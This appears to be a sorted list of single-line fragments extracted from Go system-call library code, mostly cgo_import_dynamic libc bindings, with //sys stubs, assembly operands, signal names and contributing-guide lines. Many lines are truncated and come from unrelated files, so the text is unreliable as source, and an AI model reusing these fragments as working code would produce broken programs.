"//go:cgo_import_dynamic libc_fstatvfs fstatvfs ""libc.so"""
"//go:cgo_import_dynamic libc_fsync fsync ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_fsync fsync ""libc.so"""
"//go:cgo_import_dynamic libc_fsync_range fsync_range ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_ftruncate ftruncate ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_ftruncate ftruncate ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_ftruncate ftruncate ""libc.so"""
"//go:cgo_import_dynamic libc_futimes futimes ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_futimesat futimesat ""libc.so"""
"//go:cgo_import_dynamic libc_getcwd getcwd ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getcwd getcwd ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getcwd getcwd ""libc.so"""
"//go:cgo_import_dynamic libc_getdents getdents ""libc.so"""
"//go:cgo_import_dynamic libc_getdirent getdirent ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getdtablesize getdtablesize ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getegid getegid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getegid getegid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getegid getegid ""libc.so"""
"//go:cgo_import_dynamic libc_geteuid geteuid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_geteuid geteuid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_geteuid geteuid ""libc.so"""
"//go:cgo_import_dynamic libc_getfsstat getfsstat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getfsstat64 getfsstat64 ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getgid getgid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getgid getgid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getgid getgid ""libc.so"""
"//go:cgo_import_dynamic libc_getgroups getgroups ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getgroups getgroups ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getgroups getgroups ""libc.so"""
"//go:cgo_import_dynamic libc_gethostname gethostname ""libc.so"""
"//go:cgo_import_dynamic libc_getmsg getmsg ""libc.so"""
"//go:cgo_import_dynamic libc_getpeername getpeername ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getpeername getpeername ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getpeername getpeername ""libsocket.so"""
"//go:cgo_import_dynamic libc_getpgid getpgid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getpgid getpgid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getpgid getpgid ""libc.so"""
"//go:cgo_import_dynamic libc_getpgrp getpgrp ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getpgrp getpgrp ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getpgrp getpgrp ""libc.so"""
"//go:cgo_import_dynamic libc_getpid getpid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getpid getpid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getpid getpid ""libc.so"""
"//go:cgo_import_dynamic libc_getppid getppid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getppid getppid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getppid getppid ""libc.so"""
"//go:cgo_import_dynamic libc_getpriority getpriority ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getpriority getpriority ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getpriority getpriority ""libc.so"""
"//go:cgo_import_dynamic libc_getrlimit getrlimit ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getrlimit getrlimit ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getrlimit getrlimit ""libc.so"""
"//go:cgo_import_dynamic libc_getrusage getrusage ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getrusage getrusage ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getrusage getrusage ""libc.so"""
"//go:cgo_import_dynamic libc_getsid getsid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getsid getsid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getsid getsid ""libc.so"""
"//go:cgo_import_dynamic libc_getsockname getsockname ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getsockname getsockname ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getsockname getsockname ""libsocket.so"""
"//go:cgo_import_dynamic libc_getsockopt getsockopt ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getsockopt getsockopt ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getsystemcfg getsystemcfg ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_gettimeofday gettimeofday ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_gettimeofday gettimeofday ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_gettimeofday gettimeofday ""libc.so"""
"//go:cgo_import_dynamic libc_getuid getuid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_getuid getuid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_getuid getuid ""libc.so"""
"//go:cgo_import_dynamic libc_getxattr getxattr ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_ioctl ioctl ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_ioctl ioctl ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_ioctl ioctl ""libc.so"""
"//go:cgo_import_dynamic libc_issetugid issetugid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_kevent kevent ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_kill kill ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_kill kill ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_kill kill ""libc.so"""
"//go:cgo_import_dynamic libc_kqueue kqueue ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_lchown lchown ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_lchown lchown ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_lchown lchown ""libc.so"""
"//go:cgo_import_dynamic libc_link link ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_link link ""libc.so"""
"//go:cgo_import_dynamic libc_linkat linkat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_listen listen ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_listen listen ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_listxattr listxattr ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_lseek lseek ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_lseek lseek ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_lseek lseek ""libc.so"""
"//go:cgo_import_dynamic libc_lstat lstat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_lstat lstat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_lstat lstat ""libc.so"""
"//go:cgo_import_dynamic libc_lstat64 lstat64 ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_madvise madvise ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_madvise madvise ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_madvise madvise ""libc.so"""
"//go:cgo_import_dynamic libc_mkdir mkdir ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_mkdir mkdir ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_mkdir mkdir ""libc.so"""
"//go:cgo_import_dynamic libc_mkdirat mkdirat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_mkdirat mkdirat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_mkdirat mkdirat ""libc.so"""
"//go:cgo_import_dynamic libc_mkfifo mkfifo ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_mkfifo mkfifo ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_mkfifo mkfifo ""libc.so"""
"//go:cgo_import_dynamic libc_mkfifoat mkfifoat ""libc.so"""
"//go:cgo_import_dynamic libc_mknod mknod ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_mknod mknod ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_mknod mknod ""libc.so"""
"//go:cgo_import_dynamic libc_mknodat mknodat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_mknodat mknodat ""libc.so"""
"//go:cgo_import_dynamic libc_mlock mlock ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_mlock mlock ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_mlock mlock ""libc.so"""
"//go:cgo_import_dynamic libc_mlockall mlockall ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_mlockall mlockall ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_mlockall mlockall ""libc.so"""
"//go:cgo_import_dynamic libc_mmap mmap ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_mmap mmap ""libc.so"""
"//go:cgo_import_dynamic libc_mmap64 mmap64 ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_mount mount ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_mprotect mprotect ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_mprotect mprotect ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_mprotect mprotect ""libc.so"""
"//go:cgo_import_dynamic libc_msync msync ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_msync msync ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_msync msync ""libc.so"""
"//go:cgo_import_dynamic libc_munlock munlock ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_munlock munlock ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_munlock munlock ""libc.so"""
"//go:cgo_import_dynamic libc_munlockall munlockall ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_munlockall munlockall ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_munlockall munlockall ""libc.so"""
"//go:cgo_import_dynamic libc_munmap munmap ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_munmap munmap ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_munmap munmap ""libc.so"""
"//go:cgo_import_dynamic libc_nanosleep nanosleep ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_nanosleep nanosleep ""libc.so"""
"//go:cgo_import_dynamic libc_nrecvmsg nrecvmsg ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_nsendmsg nsendmsg ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_open open ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_open open ""libc.so"""
"//go:cgo_import_dynamic libc_open64 open64 ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_openat openat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_openat openat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_openat openat ""libc.so"""
"//go:cgo_import_dynamic libc_pathconf pathconf ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_pathconf pathconf ""libc.so"""
"//go:cgo_import_dynamic libc_pause pause ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_pause pause ""libc.so"""
"//go:cgo_import_dynamic libc_pipe pipe ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_pipe pipe ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_pipe pipe ""libc.so"""
"//go:cgo_import_dynamic libc_pipe2 pipe2 ""libc.so"""
"//go:cgo_import_dynamic libc_poll poll ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_poll poll ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_poll poll ""libc.so"""
"//go:cgo_import_dynamic libc_port_associate port_associate ""libc.so"""
"//go:cgo_import_dynamic libc_port_create port_create ""libc.so"""
"//go:cgo_import_dynamic libc_port_dissociate port_dissociate ""libc.so"""
"//go:cgo_import_dynamic libc_port_get port_get ""libc.so"""
"//go:cgo_import_dynamic libc_port_getn port_getn ""libc.so"""
"//go:cgo_import_dynamic libc_posix_fadvise64 posix_fadvise64 ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_pread pread ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_pread pread ""libc.so"""
"//go:cgo_import_dynamic libc_pread64 pread64 ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_preadv preadv ""libc.so"""
"//go:cgo_import_dynamic libc_pselect pselect ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_ptrace ptrace ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_putmsg putmsg ""libc.so"""
"//go:cgo_import_dynamic libc_pwrite pwrite ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_pwrite pwrite ""libc.so"""
"//go:cgo_import_dynamic libc_pwrite64 pwrite64 ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_pwritev pwritev ""libc.so"""
"//go:cgo_import_dynamic libc_read read ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_read read ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_read read ""libc.so"""
"//go:cgo_import_dynamic libc_readdir_r readdir_r ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_readlink readlink ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_readlink readlink ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_readlink readlink ""libc.so"""
"//go:cgo_import_dynamic libc_readlinkat readlinkat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_readv readv ""libc.so"""
"//go:cgo_import_dynamic libc_recvfrom recvfrom ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_recvfrom recvfrom ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_recvfrom recvfrom ""libsocket.so"""
"//go:cgo_import_dynamic libc_recvmsg recvmsg ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_removexattr removexattr ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_rename rename ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_rename rename ""libc.so"""
"//go:cgo_import_dynamic libc_renameat renameat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_renameat renameat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_renameat renameat ""libc.so"""
"//go:cgo_import_dynamic libc_revoke revoke ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_rmdir rmdir ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_rmdir rmdir ""libc.so"""
"//go:cgo_import_dynamic libc_select select ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_select select ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_select select ""libc.so"""
"//go:cgo_import_dynamic libc_sendfile sendfile ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_sendfile sendfile ""libsendfile.so"""
"//go:cgo_import_dynamic libc_sendmsg sendmsg ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_sendto sendto ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_sendto sendto ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setdomainname setdomainname ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setegid setegid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setegid setegid ""libc.so"""
"//go:cgo_import_dynamic libc_seteuid seteuid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_seteuid seteuid ""libc.so"""
"//go:cgo_import_dynamic libc_setgid setgid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setgid setgid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setgid setgid ""libc.so"""
"//go:cgo_import_dynamic libc_setgroups setgroups ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setgroups setgroups ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setgroups setgroups ""libc.so"""
"//go:cgo_import_dynamic libc_sethostname sethostname ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_sethostname sethostname ""libc.so"""
"//go:cgo_import_dynamic libc_setlogin setlogin ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setpgid setpgid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setpgid setpgid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setpgid setpgid ""libc.so"""
"//go:cgo_import_dynamic libc_setpriority setpriority ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setpriority setpriority ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setpriority setpriority ""libc.so"""
"//go:cgo_import_dynamic libc_setprivexec setprivexec ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setregid setregid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setregid setregid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setregid setregid ""libc.so"""
"//go:cgo_import_dynamic libc_setreuid setreuid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setreuid setreuid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setreuid setreuid ""libc.so"""
"//go:cgo_import_dynamic libc_setrlimit setrlimit ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setrlimit setrlimit ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setrlimit setrlimit ""libc.so"""
"//go:cgo_import_dynamic libc_setsid setsid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setsid setsid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setsid setsid ""libc.so"""
"//go:cgo_import_dynamic libc_setsockopt setsockopt ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setsockopt setsockopt ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setsockopt setsockopt ""libsocket.so"""
"//go:cgo_import_dynamic libc_settimeofday settimeofday ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_settimeofday settimeofday ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setuid setuid ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_setuid setuid ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_setuid setuid ""libc.so"""
"//go:cgo_import_dynamic libc_setxattr setxattr ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_shmat shmat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_shmctl shmctl ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_shmdt shmdt ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_shmget shmget ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_shutdown shutdown ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_shutdown shutdown ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_shutdown shutdown ""libsocket.so"""
"//go:cgo_import_dynamic libc_socket socket ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_socket socket ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_socketpair socketpair ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_socketpair socketpair ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_splice splice ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_stat stat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_stat stat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_stat stat ""libc.so"""
"//go:cgo_import_dynamic libc_stat64 stat64 ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_statfs statfs ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_statfs statfs ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_statfs64 statfs64 ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_statvfs statvfs ""libc.so"""
"//go:cgo_import_dynamic libc_statx statx ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_symlink symlink ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_symlink symlink ""libc.so"""
"//go:cgo_import_dynamic libc_symlinkat symlinkat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_sync sync ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_sync sync ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_sync sync ""libc.so"""
"//go:cgo_import_dynamic libc_sysconf sysconf ""libc.so"""
"//go:cgo_import_dynamic libc_sysctl sysctl ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_syslog syslog ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_time time ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_times times ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_times times ""libc.so"""
"//go:cgo_import_dynamic libc_truncate truncate ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_truncate truncate ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_truncate truncate ""libc.so"""
"//go:cgo_import_dynamic libc_umask umask ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_umask umask ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_umask umask ""libc.so"""
"//go:cgo_import_dynamic libc_umount umount ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_umount umount ""libc.so"""
"//go:cgo_import_dynamic libc_uname uname ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_uname uname ""libc.so"""
"//go:cgo_import_dynamic libc_undelete undelete ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_unlink unlink ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_unlink unlink ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_unlink unlink ""libc.so"""
"//go:cgo_import_dynamic libc_unlinkat unlinkat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_unlinkat unlinkat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_unlinkat unlinkat ""libc.so"""
"//go:cgo_import_dynamic libc_unmount unmount ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_ustat ustat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_ustat ustat ""libc.so"""
"//go:cgo_import_dynamic libc_utime utime ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_utime utime ""libc.so"""
"//go:cgo_import_dynamic libc_utimensat utimensat ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_utimensat utimensat ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_utimensat utimensat ""libc.so"""
"//go:cgo_import_dynamic libc_utimes utimes ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_utimes utimes ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_utimes utimes ""libc.so"""
"//go:cgo_import_dynamic libc_wait4 wait4 ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_wait4 wait4 ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_wait4 wait4 ""libc.so"""
"//go:cgo_import_dynamic libc_write write ""/usr/lib/libSystem.B.dylib"""
"//go:cgo_import_dynamic libc_write write ""libc.a/shr_64.o"""
"//go:cgo_import_dynamic libc_write write ""libc.so"""
"//go:cgo_import_dynamic libc_writev writev ""libc.so"""
"//if not, it means that Self has to be greater than Other"
"//proceed to return if: err is nil (found), err is nonnil but not ERANGE (another error occurred)"
"//sys   Access(path string, mode uint32) (err error) = SYS___ACCESS_A"
"//sys   CertFindCertificateInStore(store Handle, certEncodingType uint32, findFlags uint32, findType uint32, findPara unsafe.Pointer, prevCertContext "
"//sys   CertFindChainInStore(store Handle, certEncodingType uint32, findFlags uint32, findType uint32, findPara unsafe.Pointer, prevChainContext "
"//sys   Creat(path string, mode uint32) (fd int, err error) = SYS___CREAT_A"
"//sys   Mkfifo(path string, mode uint32) (err error) = SYS___MKFIFO_A"
"//sys   Mprotect(b []byte, prot int) (err error) = SYS_MPROTECT"
"//sys   Msync(b []byte, flags int) (err error) = SYS_MSYNC"
"//sys   Poll(fds []PollFd, timeout int) (n int, err error) = SYS_POLL"
"//sys   Seek(fd int, offset int64, whence int) (off int64, err error) = SYS_LSEEK"
"//sys   Select(nmsgsfds int, r "
"//sys   fcntl(fd int, cmd int, arg int) (val int, err error)"
"//sys   ioctl(fd int, req uint, arg uintptr) (err error) = SYS_IOCTL"
"//sys   mmap(addr uintptr, length uintptr, prot int, flag int, fd int, pos int64) (ret uintptr, err error) = SYS_MMAP"
"//sys   mount_LE(path string, filesystem string, fstype string, mtm uint32, parmlen int32, parm string) (err error) = SYS___MOUNT_A"
"//sys   munmap(addr uintptr, length uintptr) (err error) = SYS_MUNMAP"
"//sys   readlen(fd int, buf "
"//sys   unmount(filesystem string, mtm int) (err error) = SYS___UMOUNT_A"
"//sys WTSEnumerateSessions(handle Handle, reserved uint32, version uint32, sessions "
"//sys WTSQueryUserToken(session uint32, token "
"//sys cm_MapCrToWin32Err(configRet CONFIGRET, defaultWin32Error Errno) (ret Errno) = CfgMgr32.CM_MapCrToWin32Err"
"//sysnb Getsid(pid int) (sid int, err error) = SYS_GETSID"
"//sysnb getrusage(who int, rusage "
"/src/sys/kern/syscalls.master'"""
"0"")."
"0"", ""/etc/hosts""},"
"0""},"
"0(FP), A7"
"0(FP), AX  // syscall entry"
"0(FP), AX"
"0(FP), R0   // Move SVC args into registers"
"0(FP), R1"
"0(FP), R11"
"0(FP), R15"
"0(FP), R2"
"0(FP), R5"
"0(FP), R7"
"0(FP), R8"
"0(FP), R9"
"0(R3), R3"
"0(R9), R15"
"0(R9), R4"
"0(R9), R5, R6"
"0), but an unsigned value is necessary"
"0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 255, 255, 255, 255, 255, 255,"
"0, 2, 4, 6,"
"0x25a207b9,"
"0x436b,"
"0x43ca,"
"0x4660,"
"0x6f1f,"
"0x754f,"
"0xa441e712,"
"0xddf3,"
"0xf689d7c8,"
"1"" means that no specific value was passed, so increment"
"1"" {"
"1)) ]}"" ] "
"1, 8)"
"1. Before filing an issue, please check the existing issues to see if a"
"1. CLA: Upon submitting a Pull Request (PR), contributors will be prompted to"
"1. If you believe you've found a bug, please provide detailed steps of"
"1. Since this is golang project, ensure the new code is properly formatted to"
"1. Tests: If you are submitting code, please ensure you have adequate tests"
"10: ""user defined signal 1"","
"11),"
"11: ""segmentation fault"","
"12(FP), DX"
"12(FP), R2"
"12(FP), R6"
"128 // sizeof_field(struct hid_device, name)"
"12: ""user defined signal 2"","
"13: ""broken pipe"","
"14, 16,"
"14: ""alarm clock"","
"15: ""terminated"","
"16(FP), A1"
"16(FP), R1"
"16(FP), R2"
"16(FP), R3"
"16(FP), R4"
"16(FP), R5"
"16(FP), SI"
"16(FP), g"
"16), R9"
"19, 21,"
"1:  ""hangup"","
"1:], t.line[t.pos:])"
"1}"")"
"2 ""GOARCH or GOOS not defined in environment"""
"2 ""In the Docker based build system, mkerrors should not be called directly."""
"2 ""See README.md"""
"2 here, the kernel"
"2 is here, but the"
"2'"", ""x""},"
"2, cols, line[sidx"
"2/g"" "
"2004h"")"
"2004l"")"
"24(FP), A2"
"24(FP), DX"
"24(FP), R2"
"24(FP), R3"
"24(FP), R4"
"24(FP), R5"
"24(FP), R6"
"24, 26, 28, 30, 32, 34} {"
"255, 10, 11, 12, 13, 14, 15, 255, 255, 255, 255, 255, 255, 255, 255, 255,"
"255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,"
"2:  ""interrupt"","
"2], s[i"
"32(FP), R12"
"3:  ""quit"","
"4(FP), BX"
"4(FP), R0"
"4(FP), R4"
"4, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,"
"40(FP), R12"
"48(FP), R12"
"4:  ""illegal instruction"","
"5.3. In the event of termination under Sections 5.1 or 5.2 above, all end user"
"56(FP), R12"
